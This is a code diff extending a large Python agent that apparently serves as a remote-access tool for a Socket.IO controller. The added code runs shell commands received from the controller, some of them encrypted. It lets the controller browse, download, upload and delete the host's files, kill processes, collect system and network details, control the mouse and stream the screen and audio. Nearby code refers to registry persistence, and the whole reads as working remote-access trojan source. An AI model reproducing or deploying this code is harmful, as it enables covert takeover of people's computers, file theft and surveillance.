+def on_get_monitors(data):
+    try:
+        agent_id = get_or_create_agent_id()
+        if not MSS_AVAILABLE:
+            safe_emit('monitors_list', {'agent_id': agent_id, 'monitors': []})
+            return
+        import mss
+        with mss.mss() as sct:
+            out = []
+            for i, m in enumerate(sct.monitors[1:], start=1):
+                w = int(m.get('width', (m['right'] - m['left'])))
+                h = int(m.get('height', (m['bottom'] - m['top'])))
+                out.append({'index': i, 'width': w, 'height': h, 'left': int(m['left']), 'top': int(m['top']), 'name': f'Monitor {i}', 'primary': i == 1})
+        safe_emit('monitors_list', {'agent_id': agent_id, 'monitors': out})
+    except Exception:
+        try:
+            safe_emit('monitors_list', {'agent_id': get_or_create_agent_id(), 'monitors': []})
+        except Exception:
+            pass
+
+def on_switch_monitor(data):
+    try:
+        idx = int(data.get('monitor_index') or 1)
+        if idx < 1:
+            idx = 1
+        global SELECTED_MONITOR_INDEX
+        SELECTED_MONITOR_INDEX = idx
+    except Exception:
+        pass
+
+def on_set_display_mode(data):
+    try:
+        mode = str(data.get('mode') or 'single')
+        pm = data.get('pip_monitor')
+        global DISPLAY_MODE, PIP_MONITOR_INDEX
+        if mode in ('single', 'combined', 'pip'):
+            DISPLAY_MODE = mode
+        if pm is not None:
+            try:
+                PIP_MONITOR_INDEX = int(pm)
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+def on_set_audio_volumes(data):
+    try:
+        mv = float(data.get('mic_volume', 1.0))
+        sv = float(data.get('system_volume', 1.0))
+        mv = 0.0 if mv < 0.0 else (1.0 if mv > 1.0 else mv)
+        sv = 0.0 if sv < 0.0 else (1.0 if sv > 1.0 else sv)
+        global MIC_VOLUME, SYSTEM_VOLUME
+        MIC_VOLUME = mv
+        SYSTEM_VOLUME = sv
+    except Exception:
+        pass
+
+def on_toggle_noise_reduction(data):
+    try:
+        en = bool(data.get('enabled', False))
+        global NOISE_REDUCTION_ENABLED
+        NOISE_REDUCTION_ENABLED = en
+    except Exception:
+        pass
+
+def on_toggle_echo_cancellation(data):
+    try:
+        en = bool(data.get('enabled', False))
+        global ECHO_CANCELLATION_ENABLED
+        ECHO_CANCELLATION_ENABLED = en
+    except Exception:
+        pass
 def handle_voice_playback(command_parts):
     """Handle voice playback from controller."""
     try:
@@ -11453,6 +12166,9 @@ if AIORTC_AVAILABLE:
             self.target_fps = target_fps
             self.quality = quality
             self.frame_interval = 1.0 / target_fps
+            self._target_fps = target_fps
+            self.target_width = WEBRTC_CONFIG['quality_levels']['low']['width']
+            self.target_height = WEBRTC_CONFIG['quality_levels']['low']['height']
             self.last_frame_time = 0
             self.capture = None
             self._start_time = time.time()
@@ -11526,6 +12242,10 @@ if AIORTC_AVAILABLE:
                     # Generate placeholder frame
                     img_array = np.zeros((480, 640, 3), dtype=np.uint8)
                 
+                # Resize
+                h, w = img_array.shape[:2]
+                if w != self.target_width or h != self.target_height:
+                    img_array = cv2.resize(img_array, (self.target_width, self.target_height), interpolation=cv2.INTER_AREA)
                 # Create VideoFrame for aiortc
                 frame = av.VideoFrame.from_ndarray(img_array, format="bgr24")
                 frame.pts, frame.time_base = await self.next_timestamp()
@@ -11552,12 +12272,21 @@ if AIORTC_AVAILABLE:
             return self.stats.copy()
     
         def set_quality(self, quality):
-            """Set video quality (1-100)."""
             self.quality = max(1, min(100, quality))
+            q = self.quality
+            if q <= 55:
+                self.target_width = 640
+                self.target_height = 480
+            elif q <= 75:
+                self.target_width = 1280
+                self.target_height = 720
+            else:
+                self.target_width = 1920
+                self.target_height = 1080
     
         def set_fps(self, fps):
-            """Set target frame rate."""
             self.target_fps = max(1, min(60, fps))
+            self._target_fps = self.target_fps
             self.frame_interval = 1.0 / self.target_fps
 
 
@@ -11707,6 +12436,7 @@ if AIORTC_AVAILABLE:
             self.target_fps = target_fps
             self.quality = quality
             self.frame_interval = 1.0 / target_fps
+            self._target_fps = target_fps
             self.last_frame_time = 0
             self.capture = None
             self._start_time = time.time()
@@ -11793,12 +12523,26 @@ if AIORTC_AVAILABLE:
             return self.stats.copy()
         
         def set_quality(self, quality):
-            """Set video quality (1-100)."""
             self.quality = max(1, min(100, quality))
+            q = self.quality
+            w = 640
+            h = 480
+            if q <= 55:
+                w, h = 640, 480
+            elif q <= 75:
+                w, h = 1280, 720
+            else:
+                w, h = 1920, 1080
+            if self.capture:
+                try:
+                    self.capture.set(cv2.CAP_PROP_FRAME_WIDTH, w)
+                    self.capture.set(cv2.CAP_PROP_FRAME_HEIGHT, h)
+                except Exception:
+                    pass
         
         def set_fps(self, fps):
-            """Set target frame rate."""
             self.target_fps = max(1, min(60, fps))
+            self._target_fps = self.target_fps
             self.frame_interval = 1.0 / self.target_fps
         
         def __del__(self):
@@ -11893,14 +12637,20 @@ def test_process_termination_functionality():
 
 try:
     import eventlet
-    eventlet.monkey_patch()
-    
+    try:
+        import eventlet.hubs
+        eventlet.hubs.use_hub("eventlet.hubs.asyncio")
+    except Exception:
+        pass
+    try:
+        eventlet.monkey_patch()
+    except Exception:
+        pass
     from flask import Flask, request, jsonify, redirect, url_for, Response, send_file
     from flask_socketio import SocketIO, emit, join_room, leave_room
-    
     FLASK_AVAILABLE = True
     FLASK_SOCKETIO_AVAILABLE = True
-except ImportError:
+except Exception:
     FLASK_AVAILABLE = False
     FLASK_SOCKETIO_AVAILABLE = False
     log_message("Flask/SocketIO not available. Controller functionality disabled.")
@@ -11921,7 +12671,7 @@ def initialize_controller():
     
     controller_app = Flask(__name__)
     controller_app.config['SECRET_KEY'] = 'neural_control_hub_secret_key'
-    controller_socketio = SocketIO(controller_app, async_mode='eventlet')
+    controller_socketio = SocketIO(controller_app, async_mode=('eventlet' if FLASK_SOCKETIO_AVAILABLE else 'threading'))
     
     # Setup routes and handlers
     setup_controller_routes()
@@ -13247,6 +13997,13 @@ def on_command(data):
     
     agent_id = get_or_create_agent_id()
     command = data.get("command")
+    try:
+        if data.get("encrypted"):
+            command = _e2e_decrypt(agent_id, command)
+    except Exception:
+        pass
+    if isinstance(command, str) and command.startswith("ll"):
+        command = "list-dir" + command[2:]
     
     # Run in separate thread to prevent blocking Socket.IO
     def execute_in_thread():
@@ -13528,6 +14285,18 @@ def on_command(data):
             output += "2. Verify signature\n"
             output += "3. Replace current executable\n"
             output += "4. Restart with new version"
+        elif isinstance(command, str) and command.lower().startswith("cd "):
+            try:
+                path = command[3:].strip()
+                if len(path) == 1 and path.isalpha():
+                    path = f"{path}:\\"
+                elif len(path) == 2 and path[1] == ":" and path[0].isalpha():
+                    path = f"{path}\\"
+                path = os.path.expanduser(path)
+                os.chdir(path)
+                output = f"Changed directory to: {os.getcwd()}"
+            except Exception as e:
+                output = f"cd error: {str(e)}"
         elif command != "sleep":
             output = execute_command(command)
         
@@ -13591,6 +14360,11 @@ def on_execute_command(data):
         
         agent_id = data.get('agent_id')
         command = data.get('command')
+        try:
+            if data.get("encrypted"):
+                command = _e2e_decrypt(agent_id, command)
+        except Exception:
+            pass
         execution_id = data.get('execution_id')
         
         print(f"🔍 Agent ID in event: {agent_id}")
@@ -13785,6 +14559,15 @@ def on_execute_command(data):
             except Exception as e:
                 output = f"Error executing '{command}': {e}"
                 success = False
+        elif command.lower().startswith("cd "):
+            try:
+                path = command[3:].strip()
+                os.chdir(path)
+                output = f"Changed directory to: {os.getcwd()}"
+                success = True
+            except Exception as e:
+                output = f"cd error: {str(e)}"
+                success = False
         else:
             # Execute as system command
             try:
@@ -13892,6 +14675,33 @@ def on_mouse_move(data):
         
         x = data.get('x')
         y = data.get('y')
+        width = data.get('width')
+        height = data.get('height')
+        
+        # Normalize to screen coordinates if width/height provided
+        try:
+            nx = float(x)
+            ny = float(y)
+            if width is not None and height is not None and 0.0 <= nx <= 1.0 and 0.0 <= ny <= 1.0:
+                screen_w = None
+                screen_h = None
+                try:
+                    import pyautogui
+                    sw, sh = pyautogui.size()
+                    screen_w, screen_h = int(sw), int(sh)
+                except Exception:
+                    try:
+                        import ctypes
+                        user32 = ctypes.windll.user32
+                        screen_w = int(user32.GetSystemMetrics(0))
+                        screen_h = int(user32.GetSystemMetrics(1))
+                    except Exception:
+                        pass
+                if screen_w and screen_h:
+                    x = int(nx * screen_w)
+                    y = int(ny * screen_h)
+        except Exception:
+            pass
         
         if mouse_controller:
             mouse_controller.position = (x, y)
@@ -13913,9 +14723,48 @@ def on_mouse_click(data):
         
         button = data.get('button')
         event_type = data.get('event_type')
+        x = data.get('x')
+        y = data.get('y')
+        width = data.get('width')
+        height = data.get('height')
+        
+        # Move to target position if coordinates provided
+        try:
+            nx = float(x)
+            ny = float(y)
+            pos_x = x
+            pos_y = y
+            if width is not None and height is not None and 0.0 <= nx <= 1.0 and 0.0 <= ny <= 1.0:
+                screen_w = None
+                screen_h = None
+                try:
+                    import pyautogui
+                    sw, sh = pyautogui.size()
+                    screen_w, screen_h = int(sw), int(sh)
+                except Exception:
+                    try:
+                        import ctypes
+                        user32 = ctypes.windll.user32
+                        screen_w = int(user32.GetSystemMetrics(0))
+                        screen_h = int(user32.GetSystemMetrics(1))
+                    except Exception:
+                        pass
+                if screen_w and screen_h:
+                    pos_x = int(nx * screen_w)
+                    pos_y = int(ny * screen_h)
+            if mouse_controller and pos_x is not None and pos_y is not None:
+                mouse_controller.position = (pos_x, pos_y)
+        except Exception:
+            pass
 
         if mouse_controller:
-            mouse_button = getattr(pynput.mouse.Button, button)
+            try:
+                mouse_button = getattr(pynput.mouse.Button, str(button).lower())
+            except Exception:
+                # Map numeric buttons to names
+                btn_map = {0: 'left', 1: 'middle', 2: 'right'}
+                name = btn_map.get(int(button) if isinstance(button, (int, float)) else 0, 'left')
+                mouse_button = getattr(pynput.mouse.Button, name)
             if event_type == 'down':
                 mouse_controller.press(mouse_button)
             elif event_type == 'up':
@@ -14397,6 +15246,25 @@ def on_webrtc_implement_frame_dropping(data):
         log_message(error_msg, "error")
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
+def on_feature_toggle(data):
+    if not SOCKETIO_AVAILABLE or sio is None:
+        return
+    try:
+        feature = str((data or {}).get('feature') or '').strip()
+        enabled = bool((data or {}).get('enabled'))
+        global WEBRTC_CONFIG
+        if feature == 'adaptive_bitrate':
+            WEBRTC_CONFIG['adaptive_bitrate'] = enabled
+        elif feature == 'frame_dropping':
+            WEBRTC_CONFIG['frame_dropping'] = enabled
+        elif feature == 'monitoring':
+            m = WEBRTC_CONFIG.get('monitoring') or {}
+            m['connection_quality_metrics'] = enabled
+            WEBRTC_CONFIG['monitoring'] = m
+        safe_emit('feature_toggle_applied', {'feature': feature, 'enabled': enabled, 'agent_id': get_or_create_agent_id()})
+    except Exception as e:
+        log_message(f"Feature toggle error: {str(e)}", "error")
+
 def get_webrtc_status():
     """Get comprehensive WebRTC status and capabilities."""
     status = {
@@ -14646,6 +15514,588 @@ def check_registry_persistence():
     except Exception as e:
         log_message(f"[INFO] No registry persistence found: {e}")
         return False
+import mimetypes
+import stat
+from datetime import datetime as _dt
+from pathlib import Path as _Path
+
+class FileSystemManager:
+    def __init__(self, socket_client, agent_id):
+        self.socket = socket_client
+        self.agent_id = agent_id
+        self.active_uploads = {}
+        self.active_downloads = {}
+        self.register_handlers()
+    def register_handlers(self):
+        @self.socket.on('browse_files')
+        def handle_browse_files(data):
+            path = data.get('path', os.path.expanduser('~'))
+            try:
+                files = self.list_directory(path)
+                safe_emit('file_list', {'agent_id': self.agent_id, 'path': path, 'files': files})
+            except Exception as e:
+                safe_emit('file_list', {'agent_id': self.agent_id, 'path': path, 'files': [], 'error': str(e)})
+        @self.socket.on('download_file')
+        def handle_download_file(data):
+            file_path = data.get('path')
+            download_id = data.get('download_id')
+            try:
+                self.send_file(file_path, download_id)
+            except Exception as e:
+                safe_emit('file_chunk_from_agent', {'agent_id': self.agent_id, 'filename': os.path.basename(file_path or ''), 'download_id': download_id, 'error': str(e)})
+        @self.socket.on('upload_file_start')
+        def handle_upload_start(data):
+            filename = data.get('filename')
+            destination = data.get('destination')
+            total_size = int(data.get('total_size') or 0)
+            upload_id = data.get('upload_id') or f'ul_{int(time.time())}'
+            self.active_uploads[upload_id] = {'filename': filename, 'destination': destination, 'total_size': total_size, 'received': 0, 'chunks': [], 'start_time': time.time()}
+            safe_emit('upload_ready', {'agent_id': self.agent_id, 'upload_id': upload_id})
+        @self.socket.on('upload_file_chunk')
+        def handle_upload_chunk(data):
+            upload_id = data.get('upload_id')
+            chunk_data = data.get('chunk')
+            offset = int(data.get('offset') or 0)
+            if not upload_id or upload_id not in self.active_uploads:
+                return
+            up = self.active_uploads[upload_id]
+            try:
+                payload = chunk_data.split(',', 1)[1] if isinstance(chunk_data, str) and ',' in chunk_data else chunk_data
+                chunk_bytes = base64.b64decode(payload if isinstance(payload, str) else chunk_data)
+                up['chunks'].append((offset, chunk_bytes))
+                up['received'] += len(chunk_bytes)
+                progress = (up['received'] / (up['total_size'] or max(1, up['received']))) * 100.0
+                safe_emit('file_upload_progress', {'agent_id': self.agent_id, 'filename': up['filename'], 'destination_path': up.get('destination'), 'received': up['received'], 'total': up['total_size'], 'progress': int(progress)})
+            except Exception as e:
+                safe_emit('file_upload_progress', {'agent_id': self.agent_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e)})
+        @self.socket.on('upload_file_complete')
+        def handle_upload_complete(data):
+            upload_id = data.get('upload_id')
+            if not upload_id or upload_id not in self.active_uploads:
+                return
+            up = self.active_uploads[upload_id]
+            try:
+                up['chunks'].sort(key=lambda x: x[0])
+                file_data = b''.join([c for _, c in up['chunks']])
+                dest_dir = up.get('destination') or os.path.expanduser('~')
+                os.makedirs(dest_dir, exist_ok=True)
+                full_path = os.path.join(dest_dir, up['filename'])
+                with open(full_path, 'wb') as f:
+                    f.write(file_data)
+                file_hash = hashlib.sha256(file_data).hexdigest()
+                elapsed = time.time() - up['start_time']
+                safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'filename': up['filename'], 'destination_path': full_path, 'size': len(file_data), 'hash': file_hash, 'elapsed': elapsed, 'success': True})
+                del self.active_uploads[upload_id]
+            except Exception as e:
+                safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e), 'success': False})
+        @self.socket.on('delete_file')
+        def handle_delete_file(data):
+            path = data.get('path')
+            try:
+                if os.path.isfile(path):
+                    os.remove(path)
+                elif os.path.isdir(path):
+                    import shutil
+                    shutil.rmtree(path)
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'delete', 'path': path, 'success': True})
+            except Exception as e:
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'delete', 'path': path, 'success': False, 'error': str(e)})
+        @self.socket.on('rename_file')
+        def handle_rename_file(data):
+            old_path = data.get('old_path')
+            new_path = data.get('new_path')
+            try:
+                os.rename(old_path, new_path)
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'rename', 'src': old_path, 'dst': new_path, 'success': True})
+            except Exception as e:
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'rename', 'src': old_path, 'dst': new_path, 'success': False, 'error': str(e)})
+        @self.socket.on('create_directory')
+        def handle_create_directory(data):
+            path = data.get('path')
+            try:
+                os.makedirs(path, exist_ok=True)
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'mkdir', 'path': path, 'success': True})
+            except Exception as e:
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'mkdir', 'path': path, 'success': False, 'error': str(e)})
+        @self.socket.on('search_files')
+        def handle_search_files(data):
+            root_path = data.get('path', os.path.expanduser('~'))
+            pattern = data.get('pattern', '*')
+            max_results = int(data.get('max_results') or 100)
+            try:
+                results = self.search_files(root_path, pattern, max_results)
+                safe_emit('file_list', {'agent_id': self.agent_id, 'path': root_path, 'files': results})
+            except Exception as e:
+                safe_emit('file_list', {'agent_id': self.agent_id, 'path': root_path, 'files': [], 'error': str(e)})
+    def list_directory(self, path):
+        files = []
+        try:
+            parent = os.path.dirname(path)
+            if path and parent and parent != path:
+                files.append({'name': '..', 'type': 'directory', 'path': parent, 'size': None, 'modified': None, 'permissions': None})
+            for entry in os.scandir(path):
+                try:
+                    st = entry.stat()
+                    info = {'name': entry.name, 'type': 'directory' if entry.is_dir() else 'file', 'path': entry.path, 'size': st.st_size if entry.is_file() else None, 'modified': _dt.fromtimestamp(st.st_mtime).isoformat(), 'permissions': oct(st.st_mode)[-3:], 'extension': os.path.splitext(entry.name)[1][1:] if entry.is_file() else None}
+                    if entry.is_file():
+                        mt, _ = mimetypes.guess_type(entry.path)
+                        info['mime_type'] = mt
+                    files.append(info)
+                except Exception:
+                    continue
+            files.sort(key=lambda x: (x['type'] == 'file', x['name'].lower()))
+            return files
+        except Exception as e:
+            raise Exception(f"Failed to list directory: {str(e)}")
+    def send_file(self, file_path, download_id):
+        try:
+            total_size = os.path.getsize(file_path)
+            filename = os.path.basename(file_path)
+            with open(file_path, 'rb') as f:
+                offset = 0
+                while True:
+                    chunk = f.read(512 * 1024)
+                    if not chunk:
+                        break
+                    chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
+                    safe_emit('file_chunk_from_agent', {'agent_id': self.agent_id, 'filename': filename, 'download_id': download_id, 'chunk': chunk_b64, 'offset': offset, 'total_size': total_size})
+                    offset += len(chunk)
+                    progress = int((offset / total_size) * 100)
+                    safe_emit('file_download_progress', {'agent_id': self.agent_id, 'filename': filename, 'download_id': download_id, 'sent': offset, 'total': total_size, 'progress': progress})
+            safe_emit('file_download_complete', {'agent_id': self.agent_id, 'filename': filename, 'download_id': download_id, 'size': total_size, 'success': True})
+        except Exception as e:
+            safe_emit('file_chunk_from_agent', {'agent_id': self.agent_id, 'filename': os.path.basename(file_path or ''), 'download_id': download_id, 'error': str(e)})
+    def search_files(self, root_path, pattern, max_results=100):
+        import fnmatch
+        results = []
+        count = 0
+        for dirpath, dirnames, filenames in os.walk(root_path):
+            dirnames[:] = [d for d in dirnames if not d.startswith('.')]
+            for filename in filenames:
+                if fnmatch.fnmatch(filename.lower(), pattern.lower()):
+                    full_path = os.path.join(dirpath, filename)
+                    try:
+                        st = os.stat(full_path)
+                        results.append({'name': filename, 'path': full_path, 'size': st.st_size, 'modified': _dt.fromtimestamp(st.st_mtime).isoformat(), 'directory': dirpath})
+                        count += 1
+                        if count >= max_results:
+                            return results
+                    except Exception:
+                        continue
+        return results
+
+class ProcessManager:
+    def __init__(self, socket_client, agent_id):
+        self.socket = socket_client
+        self.agent_id = agent_id
+        self.monitoring_active = False
+        self.monitor_thread = None
+        self.register_handlers()
+    def register_handlers(self):
+        @self.socket.on('list_processes')
+        def handle_list_processes(data):
+            try:
+                procs = self.get_process_list()
+                safe_emit('process_list', {'agent_id': self.agent_id, 'processes': procs})
+            except Exception as e:
+                safe_emit('process_list', {'agent_id': self.agent_id, 'processes': [], 'error': str(e)})
+        @self.socket.on('kill_process')
+        def handle_kill_process(data):
+            pid = data.get('pid')
+            force = bool(data.get('force'))
+            try:
+                success, message = self.kill_process(pid, force)
+                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'kill', 'pid': pid, 'success': success, 'message': message})
+            except Exception as e:
+                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'kill', 'pid': pid, 'success': False, 'error': str(e)})
+        @self.socket.on('suspend_process')
+        def handle_suspend_process(data):
+            pid = data.get('pid')
+            try:
+                success, message = self.suspend_process(pid)
+                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'suspend', 'pid': pid, 'success': success, 'message': message})
+            except Exception as e:
+                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'suspend', 'pid': pid, 'success': False, 'error': str(e)})
+        @self.socket.on('resume_process')
+        def handle_resume_process(data):
+            pid = data.get('pid')
+            try:
+                success, message = self.resume_process(pid)
+                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'resume', 'pid': pid, 'success': success, 'message': message})
+            except Exception as e:
+                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'resume', 'pid': pid, 'success': False, 'error': str(e)})
+        @self.socket.on('get_process_details')
+        def handle_get_process_details(data):
+            pid = data.get('pid')
+            try:
+                details = self.get_process_details(pid)
+                safe_emit('process_details_response', {'agent_id': self.agent_id, 'pid': pid, 'details': details})
+            except Exception as e:
+                safe_emit('process_details_response', {'agent_id': self.agent_id, 'pid': pid, 'error': str(e)})
+        @self.socket.on('start_process_monitor')
+        def handle_start_monitor(data):
+            interval = int(data.get('interval') or 2)
+            self.start_monitoring(interval)
+            safe_emit('monitor_status', {'agent_id': self.agent_id, 'monitoring': True, 'interval': interval})
+        @self.socket.on('stop_process_monitor')
+        def handle_stop_monitor(data):
+            self.stop_monitoring()
+            safe_emit('monitor_status', {'agent_id': self.agent_id, 'monitoring': False})
+    def get_process_list(self):
+        import psutil
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'username', 'status', 'cpu_percent', 'memory_percent', 'create_time', 'exe']):
+            try:
+                pinfo = proc.info
+                processes.append({'pid': pinfo['pid'], 'name': pinfo['name'], 'username': pinfo.get('username') or 'N/A', 'status': pinfo.get('status') or 'running', 'cpu_percent': round(pinfo.get('cpu_percent') or 0, 2), 'memory_percent': round(pinfo.get('memory_percent') or 0, 2), 'created': _dt.fromtimestamp(pinfo['create_time']).isoformat() if pinfo.get('create_time') else None, 'exe': pinfo.get('exe') or 'N/A'})
+            except Exception:
+                continue
+        processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
+        return processes
+    def kill_process(self, pid, force=False):
+        import psutil
+        try:
+            process = psutil.Process(int(pid))
+            name = process.name()
+            if force:
+                process.kill()
+            else:
+                process.terminate()
+            gone, alive = psutil.wait_procs([process], timeout=3)
+            if alive:
+                process.kill()
+                gone, alive = psutil.wait_procs([process], timeout=2)
+            if alive:
+                return False, f"Failed to kill {name} (PID: {pid})"
+            return True, f"Successfully killed {name} (PID: {pid})"
+        except psutil.NoSuchProcess:
+            return False, f"Process {pid} does not exist"
+        except psutil.AccessDenied:
+            return False, f"Access denied for process {pid}"
+        except Exception as e:
+            return False, f"Failed to kill process: {str(e)}"
+    def suspend_process(self, pid):
+        import psutil
+        try:
+            process = psutil.Process(int(pid))
+            name = process.name()
+            process.suspend()
+            return True, f"Successfully suspended {name} (PID: {pid})"
+        except psutil.NoSuchProcess:
+            return False, f"Process {pid} does not exist"
+        except psutil.AccessDenied:
+            return False, f"Access denied for process {pid}"
+        except Exception as e:
+            return False, f"Failed to suspend process: {str(e)}"
+    def resume_process(self, pid):
+        import psutil
+        try:
+            process = psutil.Process(int(pid))
+            name = process.name()
+            process.resume()
+            return True, f"Successfully resumed {name} (PID: {pid})"
+        except psutil.NoSuchProcess:
+            return False, f"Process {pid} does not exist"
+        except psutil.AccessDenied:
+            return False, f"Access denied for process {pid}"
+        except Exception as e:
+            return False, f"Failed to resume process: {str(e)}"
+    def get_process_details(self, pid):
+        import psutil
+        try:
+            process = psutil.Process(int(pid))
+            details = {'pid': process.pid, 'name': process.name(), 'exe': process.exe(), 'cwd': process.cwd(), 'cmdline': ' '.join(process.cmdline()), 'status': process.status(), 'username': process.username(), 'created': _dt.fromtimestamp(process.create_time()).isoformat(), 'ppid': process.ppid(), 'parent_name': psutil.Process(process.ppid()).name() if process.ppid() else None}
+            with process.oneshot():
+                cpu_times = process.cpu_times()
+                mem = process.memory_info()
+                details['cpu'] = {'percent': process.cpu_percent(interval=0.1), 'user_time': cpu_times.user, 'system_time': cpu_times.system, 'num_threads': process.num_threads()}
+                details['memory'] = {'percent': process.memory_percent(), 'rss': mem.rss, 'vms': mem.vms, 'rss_mb': round(mem.rss / (1024 * 1024), 2), 'vms_mb': round(mem.vms / (1024 * 1024), 2)}
+                try:
+                    io_counters = process.io_counters()
+                    details['io'] = {'read_count': io_counters.read_count, 'write_count': io_counters.write_count, 'read_bytes': io_counters.read_bytes, 'write_bytes': io_counters.write_bytes}
+                except Exception:
+                    pass
+                try:
+                    open_files = process.open_files()
+                    details['open_files'] = [f.path for f in open_files[:20]]
+                except Exception:
+                    details['open_files'] = []
+                try:
+                    connections = process.connections()
+                    conns = []
+                    for conn in connections[:20]:
+                        conns.append({'fd': getattr(conn, 'fd', None), 'family': str(getattr(conn, 'family', None)), 'type': str(getattr(conn, 'type', None)), 'laddr': f"{getattr(conn.laddr, 'ip', '')}:{getattr(conn.laddr, 'port', '')}" if getattr(conn, 'laddr', None) else None, 'raddr': f"{getattr(conn.raddr, 'ip', '')}:{getattr(conn.raddr, 'port', '')}" if getattr(conn, 'raddr', None) else None, 'status': getattr(conn, 'status', None)})
+                    details['connections'] = conns
+                except Exception:
+                    details['connections'] = []
+            return details
+        except psutil.NoSuchProcess:
+            raise Exception(f"Process {pid} does not exist")
+        except psutil.AccessDenied:
+            raise Exception(f"Access denied for process {pid}")
+        except Exception as e:
+            raise Exception(f"Failed to get process details: {str(e)}")
+    def start_monitoring(self, interval):
+        import psutil, threading
+        if self.monitoring_active:
+            return
+        self.monitoring_active = True
+        def monitor_loop():
+            while self.monitoring_active:
+                try:
+                    processes = []
+                    for proc in psutil.process_iter(['pid','name','cpu_percent','memory_percent']):
+                        try:
+                            info = proc.info
+                            processes.append({'pid': info['pid'], 'name': info['name'], 'cpu_percent': round(info.get('cpu_percent') or 0, 2), 'memory_percent': round(info.get('memory_percent') or 0, 2)})
+                        except Exception:
+                            continue
+                    processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
+                    top = processes[:20]
+                    cpu_percent = psutil.cpu_percent(interval=None)
+                    memory = psutil.virtual_memory()
+                    safe_emit('process_monitor_update', {'agent_id': self.agent_id, 'timestamp': time.time(), 'system': {'cpu_percent': cpu_percent, 'memory_percent': memory.percent, 'memory_available_mb': round(memory.available / (1024 * 1024), 2)}, 'top_processes': top})
+                except Exception:
+                    pass
+                time.sleep(interval)
+        self.monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
+        self.monitor_thread.start()
+    def stop_monitoring(self):
+        self.monitoring_active = False
+
+class SystemInfoGatherer:
+    def __init__(self, socket_client, agent_id):
+        self.socket = socket_client
+        self.agent_id = agent_id
+        self.register_handlers()
+    def register_handlers(self):
+        @self.socket.on('get_system_info')
+        def handle_get_system_info(data):
+            level = str(data.get('detail_level') or 'full').lower()
+            try:
+                if level == 'basic':
+                    info = self.get_basic_info()
+                elif level == 'standard':
+                    info = self.get_standard_info()
+                else:
+                    info = self.get_full_info()
+                safe_emit('system_info_response', {'agent_id': self.agent_id, 'info': info, 'detail_level': level, 'success': True})
+            except Exception as e:
+                safe_emit('system_info_response', {'agent_id': self.agent_id, 'error': str(e), 'success': False})
+        @self.socket.on('get_network_info')
+        def handle_get_network_info(data):
+            try:
+                info = self.get_network_info()
+                safe_emit('network_info_response', {'agent_id': self.agent_id, 'info': info, 'success': True})
+            except Exception as e:
+                safe_emit('network_info_response', {'agent_id': self.agent_id, 'error': str(e), 'success': False})
+        @self.socket.on('get_installed_software')
+        def handle_get_software(data):
+            try:
+                software = self.get_installed_software()
+                safe_emit('installed_software_response', {'agent_id': self.agent_id, 'software': software, 'count': len(software), 'success': True})
+            except Exception as e:
+                safe_emit('installed_software_response', {'agent_id': self.agent_id, 'error': str(e), 'success': False})
+    def get_basic_info(self):
+        return {'hostname': socket.gethostname(), 'platform': platform.system(), 'platform_release': platform.release(), 'architecture': platform.machine(), 'processor': platform.processor(), 'username': os.getenv('USERNAME') or os.getenv('USER'), 'timestamp': datetime.datetime.now().isoformat()}
+    def get_standard_info(self):
+        info = self.get_basic_info()
+        try:
+            import psutil
+            cpu_freq = psutil.cpu_freq()
+            info['cpu'] = {'physical_cores': psutil.cpu_count(logical=False), 'logical_cores': psutil.cpu_count(logical=True), 'current_freq_mhz': cpu_freq.current if cpu_freq else None, 'usage_percent': psutil.cpu_percent(interval=0.5)}
+            memory = psutil.virtual_memory()
+            info['memory'] = {'total_gb': round(memory.total / (1024**3), 2), 'available_gb': round(memory.available / (1024**3), 2), 'used_gb': round(memory.used / (1024**3), 2), 'percent': memory.percent}
+            disk = psutil.disk_usage(os.path.abspath(os.sep))
+            info['disk'] = {'total_gb': round(disk.total / (1024**3), 2), 'used_gb': round(disk.used / (1024**3), 2), 'free_gb': round(disk.free / (1024**3), 2), 'percent': disk.percent}
+        except Exception:
+            pass
+        return info
+    def get_full_info(self):
+        info = self.get_standard_info()
+        try:
+            import cpuinfo
+            cpu_info = cpuinfo.get_cpu_info()
+            c = info.setdefault('cpu', {})
+            c['brand'] = cpu_info.get('brand_raw')
+            c['vendor'] = cpu_info.get('vendor_id_raw')
+            flags = cpu_info.get('flags') or []
+            c['flags'] = flags[:20]
+        except Exception:
+            pass
+        try:
+            import psutil
+            parts = []
+            for p in psutil.disk_partitions():
+                try:
+                    u = psutil.disk_usage(p.mountpoint)
+                    parts.append({'device': p.device, 'mountpoint': p.mountpoint, 'fstype': p.fstype, 'total_gb': round(u.total / (1024**3), 2), 'used_gb': round(u.used / (1024**3), 2), 'free_gb': round(u.free / (1024**3), 2), 'percent': u.percent})
+                except Exception:
+                    continue
+            info['disk_partitions'] = parts
+            nets = []
+            for name, addrs in psutil.net_if_addrs().items():
+                ni = {'name': name, 'addresses': []}
+                for a in addrs:
+                    ni['addresses'].append({'family': str(getattr(a, 'family', '')), 'address': getattr(a, 'address', ''), 'netmask': getattr(a, 'netmask', None), 'broadcast': getattr(a, 'broadcast', None)})
+                nets.append(ni)
+            info['network_interfaces'] = nets
+            bt = datetime.datetime.fromtimestamp(psutil.boot_time())
+            info['boot_time'] = bt.isoformat()
+            info['uptime_seconds'] = (datetime.datetime.now() - bt).total_seconds()
+        except Exception:
+            pass
